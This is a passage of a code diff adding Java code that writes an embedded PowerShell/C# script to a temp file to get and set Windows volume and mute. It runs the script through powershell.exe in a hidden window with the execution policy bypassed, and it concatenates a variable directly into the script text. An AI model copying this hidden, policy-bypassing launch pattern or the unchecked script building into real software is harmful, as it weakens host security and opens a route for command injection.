+                    "    static IAudioEndpointVolume Vol()\n" +
+                    "    {\n" +
+                    "        var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;\n" +
+                    "        IMMDevice dev = null;\n" +
+                    "        Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));\n" +
+                    "        IAudioEndpointVolume epv = null;\n" +
+                    "        var epvid = typeof(IAudioEndpointVolume).GUID;\n" +
+                    "        Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));\n" +
+                    "        return epv;\n" +
+                    "    }\n" +
+                    "    public static float Volume\n" +
+                    "    {\n" +
+                    "        get { float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "    public static bool Mute\n" +
+                    "    {\n" +
+                    "        get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }\n" +
+                    "        set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }\n" +
+                    "    }\n" +
+                    "}\n" +
+                    "'@\n" +
+                    "[audio]::Mute = $" + mute;
+            // Executing the command
+            File file = File.createTempFile("AudioUp", ".ps1");
+            FileWriter fw = new java.io.FileWriter(file);
+            fw.write(command);
+            fw.close();
+            Process powerShellProcess = Runtime.getRuntime().exec("powershell.exe -windowStyle hidden -Exec Bypass /c \"" + file.getPath() + "\"");
+            // Getting the results
+            powerShellProcess.getOutputStream().close();
+            String line;
+            System.out.println("Standard Output:");
+            BufferedReader stdout = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getInputStream()));
+            while ((line = stdout.readLine()) != null) {
+                System.out.println(line);
+            }
+            stdout.close();
+            System.out.println("Standard Error:");
+            BufferedReader stderr = new BufferedReader(new InputStreamReader(
+                    powerShellProcess.getErrorStream()));
+            while ((line = stderr.readLine()) != null) {
+                System.out.println(line);
+            }
+            stderr.close();
+            System.out.println("Done");
+            file.delete();
+        } catch (Exception e) {
+            System.out.println(e.toString());
+        }
+    }
+
+    public static boolean isValidURL(String urlString) {
+        try {
+            URL url = new URL(urlString);
+            url.toURI();
+            return true;
+        } catch (Exception exception) {
+            return false;
+        }
     }
 }
